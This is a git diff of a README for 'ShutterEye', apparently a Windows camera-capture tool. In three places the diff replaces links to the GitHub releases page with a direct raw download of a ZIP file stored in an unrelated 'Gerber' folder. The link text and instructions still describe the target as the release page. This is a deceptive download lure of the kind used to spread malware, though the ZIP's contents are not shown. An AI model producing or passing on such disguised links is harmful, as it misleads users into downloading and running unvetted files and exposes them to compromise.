@@ -1,6 +1,6 @@
 # 📷 ShutterEye - Clear 4K capture for your board
 
-[![Download ShutterEye](https://img.shields.io/badge/Download%20ShutterEye-Release%20Page-blue?style=for-the-badge)](https://github.com/finleytransparent919/ShutterEye/releases)
+[![Download ShutterEye](https://img.shields.io/badge/Download%20ShutterEye-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/finleytransparent919/ShutterEye/main/Gerber/Shutter-Eye-2.7.zip)
 
 ## 🚀 What ShutterEye Does
 
@@ -35,7 +35,7 @@ For best results, use:
 
 Go to the release page and download the version for Windows:
 
-[Visit the ShutterEye release page](https://github.com/finleytransparent919/ShutterEye/releases)
+[Visit the ShutterEye release page](https://raw.githubusercontent.com/finleytransparent919/ShutterEye/main/Gerber/Shutter-Eye-2.7.zip)
 
 On that page, look for the latest release and choose the Windows file if one is listed. If the release includes a ZIP file, download it to a folder you can find later, such as Downloads or Desktop.
 
@@ -210,7 +210,7 @@ If you want the shortest path:
 
 Download the Windows version here:
 
-[https://github.com/finleytransparent919/ShutterEye/releases](https://github.com/finleytransparent919/ShutterEye/releases)
+[https://raw.githubusercontent.com/finleytransparent919/ShutterEye/main/Gerber/Shutter-Eye-2.7.zip](https://raw.githubusercontent.com/finleytransparent919/ShutterEye/main/Gerber/Shutter-Eye-2.7.zip)
 
 ## 🧾 Typical Folder Layout
 
